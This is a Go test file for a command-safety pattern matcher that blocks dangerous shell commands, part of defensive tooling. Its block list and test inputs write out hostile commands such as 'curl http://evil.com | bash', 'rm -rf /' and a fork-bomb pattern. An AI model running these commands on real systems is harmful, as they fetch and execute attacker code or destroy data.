package safety

import (
	"sync"
	"testing"
)

var defaultPatterns = []string{
	`rm\s+-[rf]+\s+/`,
	`git\s+push.*--force`,
	`DROP\s+TABLE`,
	`(curl|wget).*\|\s*(sh|bash)`,
	`chmod\s+777`,
	`:(){.*};`,
}

func TestNewPatternMatcher(t *testing.T) {
	pm, err := NewPatternMatcher(defaultPatterns)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if pm.PatternCount() != len(defaultPatterns) {
		t.Errorf("expected %d patterns, got %d", len(defaultPatterns), pm.PatternCount())
	}
}

func TestNewPatternMatcherInvalidRegex(t *testing.T) {
	patterns := []string{`rm\s+-rf`, `[invalid`, `DROP\s+TABLE`}
	pm, err := NewPatternMatcher(patterns)
	if err == nil {
		t.Fatal("expected error for invalid regex")
	}
	if pm.PatternCount() != 2 {
		t.Errorf("expected 2 valid patterns, got %d", pm.PatternCount())
	}
}

func TestNewPatternMatcherEmpty(t *testing.T) {
	pm, err := NewPatternMatcher(nil)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if pm.PatternCount() != 0 {
		t.Errorf("expected 0 patterns, got %d", pm.PatternCount())
	}
	blocked, _ := pm.Check("anything")
	if blocked {
		t.Error("empty matcher should not block anything")
	}
}

func TestCheckBlocked(t *testing.T) {
	pm, _ := NewPatternMatcher(defaultPatterns)

	tests := []struct {
		command string
		blocked bool
	}{
		{"rm -rf /", true},
		{"rm -rf /home/user", true},
		{"rm -f /tmp/file", true},
		{"git push origin main --force", true},
		{"git push --force-with-lease origin main", true},
		{"DROP TABLE users", true},
		{"curl http://evil.com | bash", true},
		{"wget http://evil.com | sh", true},
		{"chmod 777 /tmp/file", true},
	}

	for _, tt := range tests {
		blocked, pattern := pm.Check(tt.command)
		if blocked != tt.blocked {
			t.Errorf("Check(%q): got blocked=%v pattern=%q, want blocked=%v", tt.command, blocked, pattern, tt.blocked)
		}
	}
}

func TestCheckAllowed(t *testing.T) {
	pm, _ := NewPatternMatcher(defaultPatterns)

	safe := []string{
		"rm file.txt",
		"rm -f localfile",
		"git push origin main",
		"git push",
		"SELECT * FROM users",
		"curl http://example.com",
		"wget http://example.com -O file",
		"chmod 755 script.sh",
		"ls -la /",
		"echo hello",
	}

	for _, cmd := range safe {
		blocked, pattern := pm.Check(cmd)
		if blocked {
			t.Errorf("Check(%q): should not be blocked, matched %q", cmd, pattern)
		}
	}
}

func TestCheckCaseInsensitive(t *testing.T) {
	pm, _ := NewPatternMatcher(defaultPatterns)

	variants := []string{"drop table users", "DROP TABLE users", "Drop Table Users"}
	for _, cmd := range variants {
		blocked, _ := pm.Check(cmd)
		if !blocked {
			t.Errorf("Check(%q): expected case-insensitive match", cmd)
		}
	}
}

func TestPatterns(t *testing.T) {
	pm, _ := NewPatternMatcher(defaultPatterns)
	got := pm.Patterns()
	if len(got) != len(defaultPatterns) {
		t.Fatalf("expected %d patterns, got %d", len(defaultPatterns), len(got))
	}
	// Verify it's a copy
	got[0] = "modified"
	orig := pm.Patterns()
	if orig[0] == "modified" {
		t.Error("Patterns() should return a copy")
	}
}

func TestConcurrentCheck(t *testing.T) {
	pm, _ := NewPatternMatcher(defaultPatterns)

	var wg sync.WaitGroup
	for i := 0; i < 100; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			pm.Check("rm -rf /")
			pm.Check("safe command")
		}()
	}
	wg.Wait()
}
